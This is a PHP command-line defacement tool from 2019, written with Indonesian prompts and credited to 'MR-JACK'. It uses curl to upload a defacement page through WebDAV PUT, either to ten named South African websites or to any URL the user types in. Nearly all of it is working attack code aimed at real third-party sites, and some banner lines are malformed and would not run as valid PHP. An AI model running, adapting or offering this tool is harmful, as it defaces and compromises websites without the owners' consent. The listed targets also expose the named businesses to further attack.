clear
$black = "\e[0;30m";
$blue = "\e[0;34m";
$green = "\e[0;32m";
$cyan = "\e[0;36m";
$red = "\e[0;31m";
$purple = "\e[0;35m";
$brown =  "\e[0;33m";
$lightgray = "\e[0;37m";
$darkgray = "\e[1;30m";
$lightblue = "\e[1;34m";
$lightgreen = "\e[1;32m";
$lightcyan = "\e[1;36m";
$lightred = "\e[1;31m";
$lightpurple = "\e[1;35m";
$yellow = "\e[1;33m";
$white = "\e[1;37m";
$nc = "\e[0m";


system('clear');

$darkgray # $yellow Coded  	 	: $red  MR-JACK $white
$darkgray # $yellow YouTube 	: $red  YouTube.com/c/redaxee $white
$darkgray # $yellow Intsagram   : $red _bocahkurus $green
$cyan © copyrigt 2019$darkgray
$cyan Anak bangsa Indonesia
$cyan 
echo "$green Deface Webdav$yellow 2019\n";
echo "$green Update Version$yellow 3.1\n\n";
echo "$green Otomatic/Manual? (o/m) :$blue ";
$pilih = trim(fgets(STDIN));
if ($pilih == 'o')
{
echo " LOADING.......\n";
sleep(2);
echo "$red Beri Nama Script Defacenya$green access.html\n";
echo "$blue [1] http://windmillsandporcupines.co.za
 [2] http://scnc.co.za
 [3] http://contsol.co.za
 [4] http://colourfactory.co.za
 [5] http://ayk.co.za
 [6] http://daretogowildafrica.co.za
 [7] http://floralandfresh.co.za
 [8] http://foodconsult.co.za
 [9] http://itsengineering.co.za
 [10] http://holotropicbreathwork.co.za
 [!]$red Nanti w Tambahin Lagi Kalo udah Update!\n\n";
echo "$yellow Pilih Web Yang Ingin Di Cium :$blue ";
$deface = trim(fgets(STDIN));
if ($deface == "1")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://windmillsandporcupines.co.za');
echo "[!]$green Selesai...\n";
echo "[!] Cek di$blue http://windmillsandporcupines.co.za/access.html\n";
}
if ($deface == "2")
{
echo "$green LOADING.....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://scnc.co.za') ;
echo "[!]$green Selesai...\n";
echo "[!] Cek di$blue http://scnc.co.za/access.html";
}
if ($deface == "3")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://contsol.co.za');
echo "[!]$green Selesai...\n";
echo "[!] Cek di$blue http://contsol.co.za/access.html\n";
}
if ($deface == "4")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://colourfactory.co.za'); 
echo "[!]$green Selesai...\n";
echo "[!] Cek di$blue http://colourfactory.co.za/access.html\n";
}
if ($deface == "5")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://ayk.co.za'); 
echo "[!] Selesai...\n";
echo "[!] Cek di$blue http://ayk.co.za/access.html\n";
}
if ($deface == "6")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://daretogowildafrica.co.za'); 
echo "[!] Selesai...\n";
echo "[!] Cek di$blue http://daretogowildafrica.co.za/access.html\n";
}
if ($deface == "7")
{
echo "$green LOADING....\n";
sleep(1);
system('curl -T /storage/emulated/0/access.html http://floralandfresh.co.za'); 
echo "[!] Selesai...\n";
echo "[!] Cek di$blue http://floralandfresh.co.za/access.html\n";
}
if ($deface == "8")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://foodconsult.co.za');
echo "[!]$green Selesai...\n";
echo "[!] Cek di$blue http://foodconsult.co.za/access.html\n";
}
if ($deface == "9")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://itsengineering.co.za');
echo "[!]$green Selesai...\n";
echo "[!] Cek di$blue http://itsengineering.co.za/access.html\n";
}
if ($deface == "10")
{
echo "$green LOADING....\n";
sleep(2);
system('curl -T /storage/emulated/0/access.html http://holotropicbreathwork.co.za'); 
echo "[!] Selesai...\n";
echo "[!] Cek di$blue http://holotropicbreathwork.co.za/access.html\n";
}
}

if ($pilih == "m")
{
system('clear');

$darkgray # $yellow Coded  	 	: $red  MR-JACK $white
$darkgray # $yellow YouTube 	: $red  YouTube.com/c/redaxee $white
$darkgray # $yellow Intsagram   : $red _bocahkurus $green
$cyan © copyrigt 2019$darkgray
$cyan Anak bangsa Indonesia
$cyan 
echo "$green Deface Webdav$yellow 2019\n";
echo "$green Update Version$yellow 3.1\n\n";
echo "$green Otomatic/Manual? (o/m) :$blue ";
 
echo "$green Masuk Kebagian Manual\n";
echo " Note :$red Taruh Script Deface Di Internal\n\n";
echo "$green Masukan Website Target :$blue ";
$ke1 = trim(fgets(STDIN));
echo "$green Masukan Nama Script Defacenya :$blue ";
$ke2 = trim(fgets(STDIN));
 
system("curl -T /storage/emulated/0/$ke2 $ke1");
echo "$green Selesai...\n";
echo " Cek di$blue $ke1/$ke2.html\n\e[0m";
}
